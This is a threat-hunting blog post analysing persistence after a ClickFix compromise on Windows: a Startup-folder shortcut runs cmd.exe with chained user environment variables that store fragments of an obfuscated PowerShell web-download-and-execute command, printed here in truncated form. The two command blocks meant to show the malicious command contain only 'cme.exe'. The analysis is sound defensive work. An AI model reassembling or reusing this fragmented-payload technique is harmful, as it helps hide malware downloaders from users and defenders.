---
title: "From a ClickFix compromission to a fragmented persistence"
description: "After a ClickFix compromission it was observed the installation of a persistence mechanism fragmented in different pieces."
date: 2026-09-27T10:30:00
category: Windows
tags:
  - Windows
  - Persistence
  - Threat Hunting
author: "Luca Manfrin"
published: true
archived: false
pinned: true
---

## Scenario

It was observed the execution of a malicious obfuscated cmd.exe script from the XDR dashboard, which tried to download and execute code from a remote domain.

## Details of the alert

The process tree of the alert was:`winlogon.exe → userinit.exe → explorer.exe → cmd.exe → powershell.exe`, which was observed multiple times.


This was the detail of the command:

```bash
cme.exe
```

That deobfuscated become:
```bash
cme.exe
```


## Analysis

After a first look with Autorun (by Sysinternals) it was decided to use other tool, like **PersistenceSniper**, that listed more tan 50 different types of persistence mechanism, below the details of the Startupfolder of the compromised host:

```bash
C:\Windows\System32\config\systemprofile>dir "C:\Users\<user.DOMAIN>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 Volume in drive C is Windows
 Volume Serial Number is 249F-6614

 Directory of C:\Users\<user.DOMAIN>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

13/01/2026  16:06    <DIR>          .
25/09/2026  00:53    <DIR>          ..
13/01/2026  16:06             1,926 MSEdge_Service.lnk
21/09/2026  15:36             1,321 Send to OneNote.lnk
               2 File(s)          3,247 bytes
               2 Dir(s)  189,652,443,136 bytes free
```

So it was decided to verify what's inside this two LNK files, and it was the content of `MSEdge_Service.lnk`:

```bash
C:\Windows\System32\config\systemprofile>powershell -NoProfile -Command "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('C:\Users\<user.DOMAIN>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MSEdge_Service.lnk'); $s | Format-List TargetPath,Arguments,WorkingDirectory,Description,IconLocation"
 
 
TargetPath       : C:\Windows\System32\cmd.exe
Arguments        : %msedge%%update%%/ua%%/installsource%%/chek%
WorkingDirectory : 
Description      : 
IconLocation     : C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0
```

That led to explore the environment variables of the user:
```bash
C:\Windows\System32\config\systemprofile> reg query "HKU\S-1-5-21-2520512674-1331052873-1889001270-17769\Environment"
 
 
HKEY_USERS\S-1-5-21-2520512674-1331052873-1889001270-17769\Environment
 
Path
    REG_EXPAND_SZ
    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
 
TEMP
    REG_EXPAND_SZ
    %USERPROFILE%\AppData\Local\Temp
 
TMP
    REG_EXPAND_SZ
    %USERPROFILE%\AppData\Local\Temp
 
    C:\Users\<user.DOMAIN>\OneDrive - <Name of the company>
 
msedge
    REG_SZ
    /c echo (([char]83+[char](-740+839)+[char](-853+967)+[char](718-613)+
    [char](817-705)+[char](201-85)+[char]98+[char](62+46)+
    [char](-802+913)+[char](86+13)+[char]107) -as [TYPE])::
 
    ([char]67+[char](822-708)+[char](1057-956)+[char](-721+818)+
    [char]116+[char](-23+124))
 
    (([char](524-446)+[char]101+[char](-784+900)+[char](-176+222)+
    [char](-433+520)+[char](96+5)+[char]98+[char](428-361)+
    [char](1080-972)+[char]105+[char](-607+708)+[char](809-699)+
    [char](775-659)-as[Type])::
 
    ([char](-515+625)+[char](-488+589)+[char](756-637))()
 
    .([char](895-827)+[char](240-129)+[char]119+[char]110+
    [char]108+[char]111+[char]...
 
update
    REG_SZ
    (-113+210)+[char](879-779)+[char](4+79)+[char](111+5)+
    [char](-591+705)+[char](-786+891)+[char]110+[char](539-436))
    ([char](210-106)+[char](-52+168)+[char]116+...
 
/ua
    REG_SZ
    |powe
 
/installsource
    REG_SZ
    rshell.e
 
/chek
    REG_SZ
    xe -w h -noprofile -
 
OneDriveCommercial
    REG_EXPAND_SZ
    C:\Users\<user.DOMAIN>\OneDrive - <Name of the company>
```
